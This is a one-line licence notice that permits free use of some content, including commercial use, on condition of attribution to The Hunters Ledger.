Free to use, including commercially, with attribution to The Hunters Ledger.
